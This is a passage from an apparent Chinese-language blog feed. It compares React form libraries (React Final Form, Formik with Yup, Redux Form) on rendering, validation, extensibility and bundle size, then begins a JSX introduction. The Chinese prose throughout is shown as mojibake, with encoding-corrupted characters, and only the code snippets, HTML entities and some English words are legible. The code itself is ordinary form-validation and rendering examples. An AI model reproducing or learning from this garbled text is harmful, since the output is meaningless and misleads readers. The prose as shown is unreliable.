name å’Œ email å½¼æ­¤ä¸æœƒå½±éŸ¿æ¸²æŸ“ï¼Œåªæœ‰è‡ªå·±ç‹€æ…‹æ”¹è®Šï¼Œä¾‹å¦‚å› æ‰“å­—è¼¸å…¥è€Œæ”¹è®Š value æ™‚æ‰æœƒé‡æ–°æ¸²æŸ“ã€‚

ç”±æ–¼è¡¨å–®æœ‰è¨‚é–±ç‹€æ…‹ validï¼Œå› æ­¤åªæœ‰ç•¶å…¨éƒ¨æ¬„ä½éƒ½é€šéé©—è­‰ï¼Œä¹Ÿå°±æ˜¯ valid ç”± false è®Šæˆ true æ™‚ï¼Œè¡¨å–®æ‰æœƒé‡æ–°æ¸²æŸ“ï¼Œå¯ä»¥çœ‹åˆ°æ¸²æŸ“æ¬¡æ•¸ç”± 2 è®Šæˆ 3ã€‚

å„ªé»
æœ‰è¶³å¤ çš„ API èƒ½å¯¦ä½œç´°ç·»çš„ UIï¼Œé€™æ¨£é–‹ç™¼è€…å°±ä¸éœ€è¦é‡æ–°å¯¦ä½œå–å¾—è¡¨å–®ç‹€æ…‹çš„æ–¹æ³•ï¼Œè€Œèƒ½æ¸›å°‘æ’°å¯«çš„ç¨‹å¼ç¢¼ã€‚
API å’Œ Redux Form ç›¸ä¼¼ï¼Œå¦‚æœä¹‹å‰ç”¨ Redux Form å°±ä¸ç”¨é‡æ–°å­¸ç¿’ã€‚
å°‡ç‹€æ…‹å­˜åœ¨ Final Form instance stateï¼Œè€Œéå­˜åœ¨å…¨åŸŸçš„ storeã€‚
é‡å°æ•ˆèƒ½çš„æ”¹å–„ï¼ŒReact Final Form æä¾›è¨‚é–±æ©Ÿåˆ¶ä¾†æ¸›å°‘ä¸å¿…è¦çš„æ¸²æŸ“ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œç•¶å…§éƒ¨ç‹€æ…‹æœ‰æ”¹è®Šæ™‚æ‰å»å‘¼å« setState() ä¾†åšé‡æ–°æ¸²æŸ“çš„å‹•ä½œã€‚
æ‰“åŒ…å¾Œçš„æª”æ¡ˆå¾ˆå°ï¼Œå£“ç¸®å¾Œåªæœ‰ 7.7KBã€‚
è¡¨å–®å’Œæ¬„ä½å±¤ç´šéƒ½æ”¯æ´åŒæ­¥èˆ‡éåŒæ­¥é©—è­‰ã€‚
æ“´å……æ€§é«˜ï¼Œå¯åˆ©ç”¨ decorator çš„æ–¹å¼è¼•æ˜“çš„æ–°å¢æˆ–ç§»é™¤åŠŸèƒ½ä»¥ç¬¦åˆæœªä¾†çš„éœ€æ±‚ï¼Œè€Œå› ç‚ºé€™æ¨£è€Œèƒ½ä¿æŒæ‰“åŒ…å¾Œçš„é«”ç©å¾ˆå°ã€‚

ç¼ºé»
ç„¡å…§å»ºé©—è­‰å·¥å…·ï¼Œç›®å‰ä¹Ÿæ²’æœ‰å¥½çš„å¯æ­é…çš„é©—è­‰å·¥å…·ï¼Œé©—è­‰éƒ¨ä»½è¦è‡ªå·±é–‹ç™¼ã€‚

Formik &amp; Yup

React å®˜æ–¹æ¨è–¦ï¼Œæ“šèªªæ˜¯å¯ä»¥ç„¡ç—›å»ºç«‹è¡¨å–®ã€‚
Formik æ˜¯è¡¨å–®å‡½å¼åº«ï¼ŒYup æ˜¯é©—è­‰å·¥å…·ï¼ŒFormik æœ‰å€‹ configã€ŒvalidationSchemaã€å¯å’Œ Yup äº’ç›¸æ­é…ï¼Œæœ‰è¨­å®š validationSchema é€™å€‹ config æ™‚ï¼Œå°±èƒ½å°‡ Yup å›å‚³çš„éŒ¯èª¤è¨Šæ¯è‡ªå‹•è½‰æ›æˆä¸€å€‹ç‰©ä»¶ï¼Œå…¶ key æ˜¯æ¬„ä½çš„ nameï¼Œè€Œ value å°±æ˜¯éŒ¯èª¤è¨Šæ¯ã€‚

WorkflowFormik çš„å·¥ä½œæµç¨‹æ˜¯é€™æ¨£çš„â€¦

èªªæ˜

Formik å°‡è¡¨å–®çš„ç‹€æ…‹å­˜åœ¨ form instance çš„ state è£¡é¢ã€‚
ç•¶ä½¿ç”¨è€…å°æŸå€‹ input æ‰“å­—æ™‚å°±æœƒå»æ›´æ–°è¡¨å–®çš„ç‹€æ…‹ã€‚
æ¥è‘—ï¼Œç”±æ–¼ç‹€æ…‹è¢«ä¿®æ”¹ï¼Œå› æ­¤é‡æ–°æ¸²æŸ“è¡¨å–®ï¼Œä½¿ç”¨è€…çœ‹åˆ°å‰›æ‰è¼¸å…¥çš„å€¼å’Œæ›´æ–°å¾Œçš„å…ƒä»¶ã€‚

Yup å¥½åœ¨å“ªè£¡ï¼Ÿä¸éœ€å†çœ‹åˆ° if&#x2F;else åˆ¤æ–·å¥å‚³çµ±çš„å¯«æ³•æ˜¯ç”¨ if&#x2F;else æ ¹æ“šæ¢ä»¶åˆ¤æ–·è¦ç”¨å“ªäº›è¦å‰‡ï¼Œé›œäº‚ä¸”é›£ä»¥ç¶­è­·ã€‚å¦‚ä¸‹ç¯„ä¾‹ï¼Œè¡¨å–®æ¬„ä½ä¸­æœ‰ name é€™å€‹æ¬„ä½ï¼Œè‹¥ name æ²’å¡«å‰‡é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ã€ŒRequired.ã€ï¼ˆå¿…å¡«ï¼‰ï¼Œè‹¥ name çš„å­—æ•¸å°æ–¼ 4 å€‹å­—ï¼Œå‰‡å ±éŒ¯ã€ŒLength must exceed 3 characters.ã€ï¼ˆå­—æ•¸éœ€è¦è¶…é 3 å€‹å­—ï¼‰ã€‚
if (!values.name) &#123;  errors.name = &#x27;Required.&#x27;;&#125; else if (values.name.length &lt; 4) &#123;  errors.name = &#x27;Length must exceed 3 characters.&#x27;;&#125;

åˆ©ç”¨ Yup æ”¹å¯«å¾Œï¼Œç°¡å–®æ¸…æ¥šæ˜“æ‡‚ã€‚
const schema = Yup.object().shape(&#123;  name: yup    .string()    .required(&#x27;Required.&#x27;)    .min(4, &#x27;Length must exceed 3 characters.&#x27;),&#125;);

Cross-validationä¸‹åœ–æ˜¯ä¸€å€‹ç°¡å–®çš„é›»å­å ±è¨‚é–±è¡¨å–®çš„ç¯„ä¾‹ï¼Œé©—è­‰è¦å‰‡æ˜¯å¦‚æœæ²’æœ‰å‹¾é¸è¦è¨‚é–±é›»å­å ±ï¼ˆsubscribeï¼‰çš„è©±ï¼Œå¡«å®Œåç¨±ï¼ˆnameï¼‰å°±å¯ä»¥é€å‡ºï¼›è‹¥è¦è¨‚é–±é›»å­å ±ï¼Œå‹¾é¸ã€Œè¨‚é–±é›»å­å ±ã€ä¹‹å¾Œï¼Œä¿¡ç®±ï¼ˆemailï¼‰æ¬„ä½æˆç‚ºå¿…å¡«ï¼Œå› æ­¤å°±å¿…é ˆå¡«å¯«ã€‚

åˆ©ç”¨ Yup å¯ä»¥å¾ˆè¼•æ˜“åœ°åšåˆ°æ ¹æ“šæ¢ä»¶å‹•æ…‹æ±ºå®šé©—è­‰è¦å‰‡ï¼Œå¦‚ä¸‹ç¨‹å¼ç¢¼æ‰€ç¤ºï¼Œemail çš„è¦å‰‡æ˜¯æ ¹æ“š subscribe çš„å€¼è€Œæ±ºå®šçš„ï¼Œwhen å¾Œæ¥è¦è§€å¯Ÿçš„æ¬„ä½åç¨±ï¼Œåœ¨æ­¤è§€å¯Ÿ subscribe é€™å€‹ checkbox æ˜¯å¦è¢«å‹¾é¸ï¼Œè‹¥æœ‰å‹¾é¸ï¼ˆäº¦å³ is ç‚º trueï¼‰ï¼Œå‰‡åš then å¾Œæ‰€æ¥çš„äº‹æƒ…ï¼Œå¦å‰‡åš otherwise å¾Œæ‰€æ¥çš„äº‹æƒ…ï¼Œå› ç‚ºé€™è£¡æ²’æœ‰ã€Œå¦å‰‡ã€è¦åšä»€éº¼ï¼Œæ‰€ä»¥ç¨‹å¼ç¢¼ä¸­å°±æ²’æœ‰ç¤ºç¯„äº†ã€‚
email: yup.string().when(&#x27;subscribe&#x27;, &#123;  is: true,  then: fieldSchema =&gt; fieldSchema    .required(&#x27;Required.&#x27;)    .isEmail(&#x27;Invalid email address.&#x27;),&#125;),subscribe: yup.boolean(),

Demoï¼ŒåŸå§‹ç¢¼ã€‚
å¯æ··åˆåŒæ­¥å’ŒéåŒæ­¥çš„é©—è­‰å¯æ··åˆåŒæ­¥å’ŒéåŒæ­¥çš„é©—è­‰ï¼Œè€Œä¸”å¯ä»¥ç”¨é€™æ¨£çš„æ–¹å¼æ’°å¯« .sync().async().sync().async()â€¦ç°¡æ½”æ˜“æ‡‚ã€‚
validationSchema: yup.object().shape(&#123;  name: yup    .string()    .required(&#x27;Required.&#x27;)    .isNameAvailable(&#x27;Name is taken!&#x27;) // éåŒæ­¥    .min(4, &#x27;Length must exceed 3 characters.&#x27;)  &#125;)&#125;)

Demoï¼ŒåŸå§‹ç¢¼ã€‚
æœ‰ç”¨çš„å°å·¥å…·Yup æä¾›ä¸€äº›æœ‰ç”¨çš„å·¥å…·ï¼Œåƒæ˜¯å»é™¤å‰å¾Œç©ºç™½ã€å°‡å­—ä¸²è½‰ç‚ºå…¨éƒ¨å¤§å¯«æˆ–å°å¯«ç­‰ã€‚
å¦‚ä¸‹ç¯„ä¾‹æ‰€ç¤ºï¼Œç•¶ä½¿ç”¨è€…è¼¸å…¥å­—ä¸²æ™‚ï¼Œå¯èƒ½å‰å¾Œéƒ½æœ‰ç©ºç™½ï¼Œé€™æ™‚å€™ Yup å¯å…ˆå°‡å­—ä¸²å»é™¤å‰å¾Œç©ºç™½å¾Œå†åšé©—è­‰ï¼Œè€Œä¸æœƒé€ æˆç©ºç™½ä¹Ÿæ˜¯ä¸€å€‹å­—å…ƒçš„ç‹€æ³ã€‚
ä¾‹å¦‚ï¼Œåœ¨ä»¥ä¸‹ç¨‹å¼ç¢¼çš„ç‹€æ³ä¸‹ï¼Œè¼¸å…¥äº”å€‹ç©ºç™½æˆ–å­—ä¸²ã€ŒAliceã€ï¼Œéƒ½æ˜¯å¯ä»¥é€šéé©—è­‰çš„ã€‚
name: yup.string().required(&#x27;Required.&#x27;);

è‹¥åŠ ä¸Š trim()ï¼Œå‰‡äº”å€‹ç©ºç™½æœƒè¢«å»é™¤ï¼Œè€Œé¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ï¼›å­—ä¸²ã€ŒAliceã€ä¾ç„¶å¯ä»¥é€šéé©—è­‰ã€‚
name: yup  .string()  .required(&#x27;Required.&#x27;)  .trim();

Demoï¼ŒåŸå§‹ç¢¼ã€‚
FastFieldè‹¥åªæ˜¯ä½¿ç”¨ä¸€èˆ¬çš„&lt;Field&gt;ï¼Œå‰‡æ¯æ¬¡æ¬„ä½æ›´æ–°æ™‚ï¼Œå…¶ä»–æ¬„ä½éƒ½æœƒä¸€åŒé‡æ–°æ¸²æŸ“ï¼›ä½†è‹¥æ”¹æˆ &lt;FastField&gt; å‰‡æ²’æœ‰ç›¸ä¾é—œä¿‚çš„æ¬„ä½å°±ä¸æœƒé‡æ–°æ¸²æŸ“ã€‚é€™æ˜¯ç”±æ–¼ &lt;FastField&gt; å…§éƒ¨å¯¦ä½œ shouldComponentUpdate() ä¾†æ±ºå®šæ˜¯å¦è¦é‡æ–°æ¸²æŸ“çš„ç·£æ•…ã€‚
ä¸‹åœ–æ˜¯ Formik çš„ &lt;FastField&gt; çš„æµç¨‹åœ–ï¼Œåªæœ‰éœ€è¦è¢«æ›´æ–°çš„æ¬„ä½ï¼ˆdirect updateï¼‰æ‰æœƒé‡æ–°æ¸²æŸ“ï¼Œå¦å‰‡å°± block ä½ã€‚

ä¾†çœ‹ä¸€å€‹ç¯„ä¾‹ï¼Œå¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œé€™æ˜¯ä¸€å€‹ç°¡æ˜“çš„è¡¨å–®ï¼ŒåŒ…å«å…©å€‹æ¬„ä½ Name å’Œ Passwordï¼Œå³é‚Šç°è‰²åœ“åœˆå…§çš„æ•¸å­—è¡¨ç¤ºå…ƒä»¶çš„æ¸²æŸ“æ•¸ï¼Œç”±ä¸Šè€Œä¸‹ä¾åºæ˜¯ Name æ¬„ä½ï¼ˆFastFieldï¼‰ã€Password æ¬„ä½ï¼ˆFastFieldï¼‰ï¼Œä¸€é–‹å§‹æ•¸å­—éƒ½æ˜¯ 1ã€‚

ç•¶å° Name æ¬„ä½è¼¸å…¥è³‡æ–™ã€ŒSummerã€æ™‚ï¼Œç”±æ–¼åªæœ‰ Name æ¬„ä½æ˜¯æœƒè¢«ç›´æ¥æ›´æ–°çš„ï¼Œå› æ­¤æ—é‚Šåªæœ‰ Name æ¬„ä½æ—é‚Šçš„ç°è‰²å°åœˆåœˆæ•¸å­—æœƒå¢åŠ ã€‚

Demoï¼ŒåŸå§‹ç¢¼ã€‚
å„ªé»
æœ‰è¶³å¤ çš„ API èƒ½å¯¦ä½œç´°ç·»çš„ UIï¼Œé€™æ¨£é–‹ç™¼è€…å°±ä¸éœ€è¦é‡æ–°å¯¦ä½œå–å¾—è¡¨å–®ç‹€æ…‹çš„æ–¹æ³•ï¼Œè€Œèƒ½æ¸›å°‘æ’°å¯«çš„ç¨‹å¼ç¢¼ã€‚
å°‡ç‹€æ…‹å­˜åœ¨ Formik instance stateï¼Œè€Œéå…¨åŸŸã€‚
é‡å°æ•ˆèƒ½çš„æ”¹å–„ï¼ŒFormik æä¾› FastField ä¾†æ¸›å°‘æ¸²æŸ“æ•¸ã€‚
æ‰“åŒ…å¾Œçš„æª”æ¡ˆå¾ˆå°ï¼Œå£“ç¸®å¾Œåªæœ‰ 12.7KBã€‚
Formik çš„è¡¨å–®å’Œæ¬„ä½éƒ½æ”¯æ´åŒæ­¥èˆ‡éåŒæ­¥é©—è­‰ï¼Œç›¸è¼ƒ Redux Form ä¾†èªªæ–¹ä¾¿è¨±å¤šï¼Œä¹Ÿæœ‰å¤šä¸€å€‹é¸æ“‡ã€‚
Yup èƒ½å°‡é©—è­‰è¦å‰‡æ’°å¯«å¾—æ¸…æ¥šæ˜“æ‡‚ã€‚

ç¼ºé»é›–ç„¶åŠŸèƒ½åŒ…å±±åŒ…æµ·ï¼ŒåŠŸèƒ½é½Šå…¨ï¼Œä½†ç›¸è¼ƒ Final Form å¯ç”¨ decorator ä¾†æ“´å……åŠŸèƒ½ï¼Œå½ˆæ€§è¼ƒå°ã€‚
Summaryå¦‚ä½•é¸æ“‡å¥½çš„è¡¨å–®å‡½ç¤ºåº«ï¼Ÿå†æ¬¡å›é¡§æœ¬æ–‡ä¸€é–‹å§‹æåˆ°çš„ï¼Œè¦æ€éº¼é¸æ“‡å¥½çš„è¡¨å–®å‡½å¼åº«å‘¢ï¼Ÿæˆ‘å€‘å¯ä»¥è€ƒæ…®ä»¥ä¸‹å¹¾é»â€¦

é€™å€‹å‡½å¼åº«æ˜¯æ€éº¼åšç‹€æ…‹ç®¡ç†çš„ï¼Ÿæœƒä¸æœƒæœ‰æ•ˆèƒ½å•é¡Œï¼Ÿ
API å……è¶³å—ï¼Ÿèƒ½ç‚ºé–‹ç™¼è€…æ¸›å°‘æ’°å¯«å¤šå°‘ç¨‹å¼ç¢¼ï¼Ÿé€šå¸¸ API å……è¶³çš„å‡½å¼åº«ï¼Œæ‰“åŒ…å¾Œçš„æª”æ¡ˆé«”æ©Ÿæœƒæ¯”è¼ƒå¤§ï¼Œåªèƒ½å–æ¨ä¸€ä¸‹äº†ã€‚
å¦‚ä½•æ’°å¯«é©—è­‰é‚è¼¯ï¼Ÿ
æ“´å……æ€§å¦‚ä½•ï¼Ÿæ˜¯å¦èƒ½è¼•æ˜“æ–°å¢å’Œç§»é™¤åŠŸèƒ½ä»¥ç¬¦åˆæœªä¾†çš„éœ€æ±‚ï¼Ÿ
æ–‡ä»¶æ˜¯å¦è©³ç´°ï¼Ÿç¯„ä¾‹æ˜¯å¦å……è¶³ï¼Ÿä¹‹å¾Œè‹¥é‡åˆ°å•é¡Œæ˜¯å¦èƒ½å¾ˆå¿«è¢«è§£æ±ºï¼Ÿ
æ‰“åŒ…å¾Œçš„æª”æ¡ˆå¤§å°ã€‚
Github æ˜Ÿæ˜Ÿæ•¸ and NPM ä¸‹è¼‰æ•¸ã€‚é€™æ˜¯æ¯”è¼ƒä¸é‡è¦çš„è€ƒé‡é»ï¼Œç•¢ç«Ÿéå»ç«ç´…çš„å°ˆæ¡ˆï¼Œç›®å‰å¯èƒ½å·²ä¸ç¬¦åˆéœ€æ±‚ï¼Œä½†å·²é•·æ™‚é–“ç´¯ç©äº†å¾ˆå¤šçš„æ˜Ÿæ˜Ÿæ•¸å’Œä¸‹è¼‰æ•¸ï¼›è€Œæ–°å‡ºä¾†çš„å°ˆæ¡ˆå¯èƒ½å› èµ·æ­¥è¼ƒæ™šè€Œæ²’æœ‰å¾ˆå¤šçš„æ˜Ÿæ˜Ÿæ•¸å’Œä¸‹è¼‰æ•¸ï¼Œä½†åšå¾—å»éå¸¸å¥½ã€‚
å‡½å¼åº«æä¾›çš„ç‰¹é»æ˜¯å¦èƒ½è§£æ±ºå°ˆæ¡ˆçš„éœ€æ±‚ï¼Ÿ

â€¦
ä»¥ä¸‹ä¸€ä¸€èªªæ˜ã€‚
ç‹€æ…‹ç®¡ç†
Redux Formï¼šä½¿ç”¨ Redux å„²å­˜æ‰€æœ‰è¡¨å–®çš„ç‹€æ…‹ï¼Œä¸¦ä¸”å°æ–¼å¤šé¤˜çš„æ¸²æŸ“ä¸¦ç„¡æ”¹å–„æ–¹æ³•ã€‚
React Final Formï¼šå­˜åœ¨è¡¨å–®å¯¦é«”çš„ç‹€æ…‹ä¸­ï¼Œä¸¦ä½¿ç”¨è¨‚é–±ç‹€æ…‹çš„æ–¹å¼åšæ•ˆèƒ½å„ªåŒ–ã€‚
Formikï¼šå­˜åœ¨è¡¨å–®å¯¦é«”çš„ç‹€æ…‹ä¸­ï¼Œç¶“ç”±å¯¦ä½œ &lt;Fastfield&gt; å…ƒä»¶å…§çš„ shouldComponentUpdate() åšæ•ˆèƒ½å„ªåŒ–ã€‚

ç¨‹å¼ç¢¼æ’°å¯«Redux Formã€React Final Form å’Œ Formik çš†æä¾›è¶³å¤ çš„ API ä»¥å¯¦ä½œç´°ç·»çš„è¡¨å–®ï¼Œå› æ­¤ç¯€çœé–‹ç™¼äººå“¡ä¸å°‘æ™‚é–“ã€‚
é©—è­‰
Redux Form
ç„¡å…§å»ºé©—è­‰å·¥å…·ï¼Œä½†å¯æ­é…å…¶ä»–é©—è­‰å·¥å…·ã€‚
éåŒæ­¥é©—è­‰åªæ”¯æ´è¡¨å–®å±¤ç´šçš„é©—è­‰ã€‚


React Final Form
ç„¡å…§å»ºé©—è­‰å·¥å…·ï¼Œç›®å‰ä¹Ÿæ²’æœ‰å¥½çš„å¯æ­é…çš„é©—è­‰å·¥å…·ï¼Œé©—è­‰éƒ¨ä»½è¦è‡ªå·±é–‹ç™¼ã€‚
è¡¨å–®å’Œæ¬„ä½éƒ½æ”¯æ´åŒæ­¥èˆ‡éåŒæ­¥é©—è­‰ã€‚


Formik
Yup æ˜¯å¾ˆæ£’çš„é©—è­‰å·¥å…·ï¼Œå¯«èµ·ä¾†æ¸…æ¥šç°¡æ½”ï¼Œå¥½æ‡‚å¥½ç¶­è­·ã€‚
è¡¨å–®å’Œæ¬„ä½éƒ½æ”¯æ´åŒæ­¥èˆ‡éåŒæ­¥é©—è­‰ã€‚



Extensibility
Redux Form å’Œ Formikï¼šç„¡æ“´å……æ€§ã€‚
React Final Formï¼šæ“´å……æ€§é«˜ï¼Œå¯åˆ©ç”¨ decorator çš„æ–¹å¼è¼•æ˜“çš„æ–°å¢æˆ–ç§»é™¤åŠŸèƒ½ä»¥ç¬¦åˆæœªä¾†çš„éœ€æ±‚ï¼Œä¹Ÿå› æ­¤èƒ½ä¿æŒæ‰“åŒ…å¾Œçš„é«”ç©å¾ˆå°ã€‚

Examples and documents
Redux Formï¼šæ–‡ä»¶å’Œç¯„ä¾‹ä¸å¤ æ¸…æ¥šè©³ç´°ã€‚
React Final Form å’Œ Formik çš„æ–‡ä»¶å’Œç¯„ä¾‹éƒ½å¾ˆå……è¶³è©³ç´°ã€‚

Bundle size

Redux Formï¼šæª”æ¡ˆé«”ç©å¤§ï¼Œå£“ç¸®å¾Œç´„ 26.7KBã€‚
React Final Form + Final Formï¼šå£“ç¸®å¾Œç´„ 7.7KBã€‚
Formikï¼šFormik å£“ç¸®å¾Œæ˜¯ 12KBï¼ŒYup æ˜¯ 21.6KB.

Github stars and NPM downloads

Redux Formï¼šæ¯é€±ä¸‹è¼‰æ•¸ç´„ ä¸‰åä¸ƒè¬ æ¬¡ï¼Œç´¯ç©æ˜Ÿæ˜Ÿæ•¸ç´„ ä¸€è¬ é¡†ã€‚
React Final Formï¼šæ¯é€±ä¸‹è¼‰æ•¸ç´„ å…­è¬äº” æ¬¡ï¼Œç´¯ç©æ˜Ÿæ˜Ÿæ•¸ç´„ ä¸‰åƒä¹ é¡†ã€‚
Formikï¼šæ¯é€±ä¸‹è¼‰æ•¸ç´„ ä¸‰åäºŒè¬ æ¬¡ï¼Œç´¯ç©æ˜Ÿæ˜Ÿæ•¸ç´„ ä¸€è¬å››åƒ é¡†ã€‚

ç¸½çµåœ¨ç¶“éä»¥ä¸Šæ¢ç´¢èˆ‡è¨è«–å¾Œï¼Œåšå€‹ç¸½çµâ€¦
åœ¨ç›®å‰æˆ‘æ‰€ç¶“æ‰‹çš„å°ˆæ¡ˆä¸Šï¼Œç”±æ–¼ (1) å°è¡¨å–®åŠŸèƒ½æœ‰å¼·çƒˆéœ€æ±‚ï¼Œå¿…é ˆé¡§æ…®é–‹ç™¼ä¸Šçš„ä¾¿æ·ï¼Œä¸¦ä¸” (2) å°ˆæ¡ˆå¾ˆè€äº†ï¼Œå¸¸å¸¸éœ€è¦é‡æ§‹ï¼Œè¦èƒ½æœ‰æ•ˆæ•´ç†ç¨‹å¼ç¢¼ï¼Œå› æ­¤ Formik &amp; Yup å°æˆ‘è€Œè¨€å°±æ˜¯å¾ˆå¥½çš„é¸æ“‡ï¼›è€Œä¹Ÿæœ‰äº›å°ˆæ¡ˆå°é«”ç©å¤§å°æ–¤æ–¤è¨ˆè¼ƒã€ä¸¦ä¸”ä¸éœ€è¦é€™éº¼å¤šåŠŸèƒ½ï¼Œæˆ–å¿…é ˆç¶­æŒé«˜å½ˆæ€§ã€å› æ‡‰éœ€æ±‚ç«¯çš„å¿«é€Ÿè®ŠåŒ–ï¼Œé‚£å°±å¾ˆé©åˆä½¿ç”¨ React Final Formã€‚
è©±èªªé€™éº¼å¤šï¼Œå°±æ˜¯å¸Œæœ›å¤§å®¶åœ¨èŒ«èŒ«å¤§æµ·ä¸­ï¼Œéƒ½èƒ½æ‰¾åˆ°é©åˆè‡ªå·±çš„è¡¨å–®å‡½å¼åº«æ‘Ÿï¼ğŸ‘ ğŸ‘ ğŸ‘
References
Comparison of form libraries in react
Erik Rasmussen â€” ğŸFinal Form: Form state management via Observers
Final Form: The road to the checkered flag
Formik vs Final Form

é—œæ–¼ä½œè€…ï¼š@cythilya å‰ç«¯å·¥ç¨‹å¸«ï¼Œå–œæ­¡äº¤æ›æ˜ä¿¡ç‰‡ã€è¨­è¨ˆç°¡å–®çš„å°ç‰©ã€æ—…éŠå’Œçœ‹é›»å½±ã€‚
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€çœ‹å°±æ‡‚çš„ JSX ç°¡æ˜å…¥é–€æ•™å­¸æŒ‡å—</title>
    <url>/2016/04/21/react-jsx-introduction/</url>
    <content><![CDATA[
å‰è¨€æ ¹æ“š React å®˜æ–¹å®šç¾©ï¼ŒReact æ˜¯ä¸€å€‹æ§‹å»ºä½¿ç”¨è€…ä»‹é¢çš„ JavaScritp Libraryã€‚ä»¥ MVC æ¨¡å¼ä¾†èªªï¼ŒReactJS ä¸»è¦æ˜¯è² è²¬ View çš„éƒ¨ä»½ã€‚éå»ä¸€æ®µæ™‚é–“ï¼Œæˆ‘å€‘è¢«çŒè¼¸äº†è¨±å¤šå‰ç«¯åˆ†é›¢çš„è§€å¿µï¼Œåœ¨å‰ç«¯ä¸‰å…„å¼Ÿä¸­ï¼ˆæˆ–ä¸‰å§Šå¦¹ã€ä¸‰åŠå®¢ï¼‰ï¼šHTML æŒç®¡å…§å®¹çµæ§‹ã€CSS è² è²¬å¤–è§€æ¨£å¼ï¼ŒJavaScript ä¸»ç®¡é‚è¼¯äº’å‹•ï¼Œåƒè¬ä¸è¦æ··åœ¨ä¸€å¡Šã€‚ç„¶è€Œï¼Œåœ¨ React ä¸–ç•Œè£¡ï¼Œæ‰€æœ‰äº‹ç‰©éƒ½æ˜¯ ä»¥ Component ç‚ºåŸºç¤ï¼Œå°‡åŒä¸€å€‹ Compoent ç›¸é—œçš„ç¨‹å¼å’Œè³‡æºéƒ½æ”¾åœ¨ä¸€èµ·ï¼Œè€Œåœ¨æ’°å¯« React Component æ™‚æˆ‘å€‘é€šå¸¸æœƒä½¿ç”¨ JSX çš„æ–¹å¼ä¾†æå‡ç¨‹å¼æ’°å¯«æ•ˆç‡ã€‚äº‹å¯¦ä¸Šï¼ŒJSX ä¸¦éä¸€ç¨®å…¨æ–°çš„èªè¨€ï¼Œè€Œæ˜¯ä¸€ç¨®èªæ³•ç³–ï¼ˆSyntatic Sugarï¼‰ï¼Œä¸€ç¨®èªæ³•é¡ä¼¼ XML çš„ ECMAScript èªæ³•æ“´å……ã€‚åœ¨ JSX ä¸­ HTML å’Œçµ„å»ºé€™äº›å…ƒç´ æ¨™ç±¤çš„ç¨‹å¼ç¢¼æœ‰ç·Šå¯†çš„é—œä¿‚ã€‚å› æ­¤ä½ å¯èƒ½è¦ç†Ÿæ‚‰ä¸€ä¸‹ä»¥ Component ç‚ºå–®ä½çš„æ€è€ƒæ–¹å¼ï¼ˆæœ¬æ–‡ä¸»è¦ä½¿ç”¨ ES6 èªæ³•ï¼‰ã€‚
æ­¤å¤–ï¼ŒReact å’Œ JSX çš„æ€ç¶­åœ¨æ–¼å–„ç”¨ JavaScript çš„å¼·å¤§èƒ½åŠ›ï¼Œæ”¾æ£„è¹©è…³çš„æ¨¡ç‰ˆèªè¨€ï¼Œé€™å’Œ Angular å¼·åŒ– HTML çš„ç†å¿µä¹Ÿæœ‰æ‰€ä¸åŒã€‚ç•¶ç„¶ JSX ä¸¦éå¼·åˆ¶ä½¿ç”¨ï¼Œä½ ä¹Ÿå¯ä»¥é¸æ“‡ä¸ç”¨ï¼Œå› ç‚ºæœ€çµ‚ JSX çš„å…§å®¹æœƒè½‰åŒ–æˆ JavaScriptï¼ˆç€è¦½å™¨åªçœ‹çš„æ‡‚ JavaScriptï¼‰ã€‚ä¸éç­‰ä½ é–±è®€å®Œæ¥ä¸‹ä¾†çš„å…§å®¹ï¼Œä½ æˆ–è¨±æœƒé–‹å§‹ç™¼ç¾ JSX çš„å¥½ï¼ŒèªçœŸè€ƒæ…®ä½¿ç”¨ JSX çš„èªæ³•ã€‚
ä¸€ã€ä½¿ç”¨ JSX çš„å¥½è™•1. æä¾›æ›´åŠ èªæ„åŒ–ä¸”æ˜“æ‡‚çš„æ¨™ç±¤ç”±æ–¼ JSX é¡ä¼¼ XML çš„èªæ³•ï¼Œè®“ä¸€äº›éé–‹ç™¼äººå“¡ä¹Ÿæ›´å®¹æ˜“çœ‹æ‡‚ï¼Œä¸”èƒ½ç²¾ç¢ºå®šç¾©åŒ…å«å±¬æ€§çš„æ¨¹ç‹€çµæ§‹ã€‚ä¸€èˆ¬ä¾†èªªæˆ‘å€‘æƒ³åšä¸€å€‹å›é¥‹è¡¨å–®ï¼Œä½¿ç”¨ HTML å¯«æ³•é€šå¸¸æœƒé•·é€™æ¨£ï¼š
&lt;form class=&quot;messageBox&quot;&gt;  &lt;textarea&gt;&lt;/teextarea&gt;  &lt;button type=&quot;submit&quot;&gt;&lt;/button&gt;&lt;/from&gt;

ä½¿ç”¨ JSXï¼Œå°±åƒ XML èªæ³•çµæ§‹ä¸€æ¨£å¯ä»¥è‡ªè¡Œå®šç¾©æ¨™ç±¤ä¸”æœ‰é–‹å§‹å’Œé—œé–‰ï¼Œå®¹æ˜“ç†è§£ï¼š
&lt;MessageBox /&gt;

React æ€è·¯èªç‚ºä½¿ç”¨ Component æ¯”èµ·æ¨¡ç‰ˆï¼ˆTemplateï¼‰å’Œé¡¯ç¤ºé‚è¼¯ï¼ˆDisplay Logicï¼‰æ›´èƒ½å¯¦ç¾é—œæ³¨é»åˆ†é›¢çš„æ¦‚å¿µï¼Œè€Œæ­é… JSX å¯ä»¥å¯¦ç¾è²æ˜å¼ Declarativeï¼ˆæ³¨é‡ what toï¼‰ï¼Œè€Œéå‘½ä»¤å¼  Imperativeï¼ˆæ³¨é‡ how toï¼‰çš„ç¨‹å¼æ’°å¯«æ–¹å¼ï¼š

ä»¥ Facebook ä¸Šé¢æŒ‰è®šåŠŸèƒ½ä¾†èªªï¼Œè‹¥æ˜¯å‘½ä»¤å¼ Imperative å¯«æ³•å¤§ç´„æœƒæ˜¯é•·é€™æ¨£ï¼š
if(userLikes()) &#123;  if(!hasBlueLike()) &#123;    removeGrayLike();    addBlueLike();  &#125;&#125; else &#123;  if(hasBlueLike()) &#123;    removeBlueLike();    addGrayLike();  &#125;&#125;

è‹¥æ˜¯è²æ˜å¼ Declarative å‰‡æ˜¯æœƒé•·é€™æ¨£ï¼š
if(this.state.liked) &#123;  return (&lt;BlueLike /&gt;);&#125; else &#123;  return (&lt;GrayLike /&gt;);&#125;

